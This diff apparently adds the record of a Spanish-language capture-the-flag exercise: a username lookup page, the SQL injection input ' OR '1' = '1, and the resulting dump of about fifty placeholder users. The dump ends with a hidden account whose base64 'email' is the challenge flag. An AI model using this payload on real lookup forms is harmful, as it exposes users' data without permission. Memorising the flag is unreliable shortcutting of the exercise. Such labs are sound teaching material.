@@ -1,0 +1,164 @@
+Consulta rápida por nombre de usuario
+Introduce un nombre de usuario para ver su email.
+
+Consultas frecuentes:
+
+Antonio -> antonio@web.com
+Juan -> juan@web.com
+Pedro -> pedro@web.com
+
+Input: ' OR '1' = '1
+ 
+
+Username: Antonio
+Email: antonio@web.com
+
+Username: Juan
+Email: juan@web.com
+
+Username: Pedro
+Email: pedro@web.com
+
+Username: Maria
+Email: maria@web.com
+
+Username: Jose
+Email: jose@web.com
+
+Username: Elena
+Email: elena@web.com
+
+Username: Laura
+Email: laura@web.com
+
+Username: Carlos
+Email: carlos@web.com
+
+Username: Ana
+Email: ana@web.com
+
+Username: Francisco
+Email: francisco@web.com
+
+Username: Isabel
+Email: isabel@web.com
+
+Username: Manuel
+Email: manuel@web.com
+
+Username: Carmen
+Email: carmen@web.com
+
+Username: Javier
+Email: javier@web.com
+
+Username: Sofia
+Email: sofia@web.com
+
+Username: Miguel
+Email: miguel@web.com
+
+Username: Lucia
+Email: lucia@web.com
+
+Username: Daniel
+Email: daniel@web.com
+
+Username: Teresa
+Email: teresa@web.com
+
+Username: Josefa
+Email: josefa@web.com
+
+Username: Rafael
+Email: rafael@web.com
+
+Username: Silvia
+Email: silvia@web.com
+
+Username: Pablo
+Email: pablo@web.com
+
+Username: Marina
+Email: marina@web.com
+
+Username: Alberto
+Email: alberto@web.com
+
+Username: Natalia
+Email: natalia@web.com
+
+Username: Adrian
+Email: adrian@web.com
+
+Username: Beatriz
+Email: beatriz@web.com
+
+Username: Fernando
+Email: fernando@web.com
+
+Username: Raquel
+Email: raquel@web.com
+
+Username: Diego
+Email: diego@web.com
+
+Username: Eva
+Email: eva@web.com
+
+Username: Francisca
+Email: francisca@web.com
+
+Username: David
+Email: david@web.com
+
+Username: Miriam
+Email: miriam@web.com
+
+Username: Ruben
+Email: ruben@web.com
+
+Username: Angela
+Email: angela@web.com
+
+Username: Gonzalo
+Email: gonzalo@web.com
+
+Username: Monica
+Email: monica@web.com
+
+Username: Luis
+Email: luis@web.com
+
+Username: Alicia
+Email: alicia@web.com
+
+Username: Victor
+Email: victor@web.com
+
+Username: Rosa
+Email: rosa@web.com
+
+Username: Ivan
+Email: ivan@web.com
+
+Username: Julia
+Email: julia@web.com
+
+Username: Oscar
+Email: oscar@web.com
+
+Username: Aurora
+Email: aurora@web.com
+
+Username: Alberta
+Email: alberta@web.com
+
+Username: Raul
+Email: raul@web.com
+
+Username: Celia
+Email: celia@web.com
+
+Username: hiDd3N_s3crEt
+Email: bGV0c2N0ZntTMW1wTDNfc3FMX0lOamVDdEkwbn0=
